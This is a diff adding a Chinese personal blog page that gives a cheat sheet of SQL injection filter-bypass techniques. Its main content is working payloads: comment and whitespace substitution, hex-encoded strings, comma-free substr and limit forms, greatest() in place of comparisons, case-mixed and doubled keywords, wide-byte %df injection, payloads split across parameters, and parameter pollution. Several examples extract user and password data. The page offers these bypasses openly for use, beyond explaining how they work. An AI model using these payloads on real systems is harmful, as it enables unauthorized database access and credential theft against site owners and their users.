@@ -1,0 +1,352 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>sql注入绕过 | k-onlの狗窝</title>
+    <meta name="author" content="k-onl" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/fufu1.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.org" />
+<script src="https://cdn.staticfile.org/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/lolisister1.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>K-ONLの狗窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;搜索</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;K-ONLの狗窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">搜索</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>sql注入绕过</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/12/27
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="1-绕过空格（注释符-，-a0）"><a href="#1-绕过空格（注释符-，-a0）" class="headerlink" title="1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）"></a>1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）</h3><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最基本的绕过方法，用注释替换空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* 注释 */</span><br><span class="line"></span><br><span class="line">/**/表示注释</span><br><span class="line">/*!*/表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231227203459807.png" alt="image-20231227203459807"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231227203530403.png" alt="image-20231227203530403"></p>
+<p>使用浮点数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=8E0union select 1,2,3</span><br><span class="line">相当于select * from users where id=8.0 union select 1,2,3</span><br><span class="line">只不过可以通过id=8E0union的方式将‘8’与union之间的空格填充</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-括号绕过空格"><a href="#2-括号绕过空格" class="headerlink" title="2.括号绕过空格"></a>2.括号绕过空格</h2><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select(user())from dual where(1=1)and(2=2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>（from for属于逗号绕过下面会有） 上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h3 id="3-引号绕过（使用十六进制）"><a href="#3-引号绕过（使用十六进制）" class="headerlink" title="3.引号绕过（使用十六进制）"></a>3.引号绕过（使用十六进制）</h3><p>没啥用</p>
+<p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-逗号绕过（使用from或者offset）"><a href="#4-逗号绕过（使用from或者offset）" class="headerlink" title="4.逗号绕过（使用from或者offset）"></a>4.逗号绕过（使用from或者offset）</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+
+
+<p>使用join：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
+
+
+<p>使用like：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<p>对于limit可以使用offset来绕过：</p>
+<p>对于limit可以使用offset来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p>等价于下面这条SQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="5-比较符号（）绕过（过滤了：sqlmap盲注经常使用，使用between的脚本）"><a href="#5-比较符号（）绕过（过滤了：sqlmap盲注经常使用，使用between的脚本）" class="headerlink" title="5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）"></a>5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h3><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。最常见的一个盲注的sql语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>
+
+
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
+
+
+<p>使用between and：between a and b：返回a，b之间的数据，不包含b。</p>
+<p>使用between and：between a and b：返回a，b之间的数据，不包含b。</p>
+<h3 id="6-or-and-xor-not绕过"><a href="#6-or-and-xor-not绕过" class="headerlink" title="6.or and xor not绕过"></a>6.or and xor not绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#7-绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="7.绕过注释符号（#，–(后面跟一个空格））过滤"></a>7.绕过注释符号（#，–(后面跟一个空格））过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
+<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
+<p>7.绕过注释符号（#，–(后面跟一个空格））过滤<br>id&#x3D;1’ union select 1,2,3||’1<br>复制<br>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,&#x27;3</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="8-绕过"><a href="#8-绕过" class="headerlink" title="8.&#x3D;绕过"></a>8.&#x3D;绕过</h3><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p>
+<h3 id="9-绕过union，select，where等"><a href="#9-绕过union，select，where等" class="headerlink" title="9.绕过union，select，where等"></a>9.绕过union，select，where等</h3><p>（1）使用注释符绕过</p>
+<p>常用注释符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure>
+
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure>
+
+<p>（2）使用大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure>
+
+
+<p>（3）内联注释绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure>
+
+
+<p>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="10-通用绕过（编码）"><a href="#10-通用绕过（编码）" class="headerlink" title="10.通用绕过（编码）"></a>10.通用绕过（编码）</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="11-等价函数绕过"><a href="#11-等价函数绕过" class="headerlink" title="11.等价函数绕过"></a>11.等价函数绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure>
+
+
+<p>举例：substring()和substr()无法使用时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</span><br></pre></td></tr></table></figure>
+
+
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr((select &#x27;password&#x27;),1,1) = 0x70</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x69) = 1</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x70) = 0</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x71) = -1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="12-宽字节注入"><a href="#12-宽字节注入" class="headerlink" title="12.宽字节注入"></a>12.宽字节注入</h3><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：（1）%df 吃掉 \ 具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+
+
+<p>（2）将 ‘ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。一般产生宽字节注入的PHP函数：1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 ‘ ，将 \ 转为 \，将 “ 转为 “ 。用思路一。2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一 （防御此漏洞，要将 mysql_query 设置为 binary 的方式） 3.mysql_real_escape_string()：转义下列字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00     \n     \r     \     &#x27;     &quot;     \x1a</span><br></pre></td></tr></table></figure>
+
+
+<p>（防御，将mysql设置为gbk即可）</p>
+<p>13.多参数请求拆分<br>对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。</p>
+<p>例如请求URL时，GET参数格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=[input1]&amp;b=[input2]</span><br></pre></td></tr></table></figure>
+
+
+<p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=[input1] and b=[input2]</span><br></pre></td></tr></table></figure>
+
+
+<p>这时就可以将注入语句进行拆分，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=union/*&amp;b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+
+<p>最终将参数a和参数b拼接，得到的SQL语句如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=union /*and b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<h3 id="14-参数污染"><a href="#14-参数污染" class="headerlink" title="14.参数污染"></a>14.参数污染</h3><p>当写入了两个请求参数的时候?p&#x3D;usa&amp;p&#x3D;china，根据浏览器的区别与编写代码的区别来选择接收哪一个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?p=usa&amp;p=china</span><br><span class="line">百度1</span><br><span class="line">雅虎2</span><br><span class="line">google 1+2</span><br><span class="line">php/apache 2</span><br><span class="line">flask 1</span><br><span class="line">jsp/tomcat 1</span><br><span class="line">CGI/apache 1</span><br><span class="line">python/apache 1+2</span><br><span class="line">asp/iis </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="域名转换："><a href="#域名转换：" class="headerlink" title="域名转换："></a>域名转换：</h3><p>将已有的域名重新生成一个短链接</p>
+<p>如：</p>
+<p><img src="/../../../../../Users/mio/AppData/Roaming/Typora/typora-user-images/image-20231227205707145.png" alt="image-20231227205707145"></p>
+<p>或者使用ip转数字：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231227210039809.png" alt="image-20231227210039809"></p>
+<p>此时，访问192.168.2.99:808与访问<a href="http://3232236131:808效果是一样的">http://3232236131:808效果是一样的</a></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 k-onlの狗窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;k-onl
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
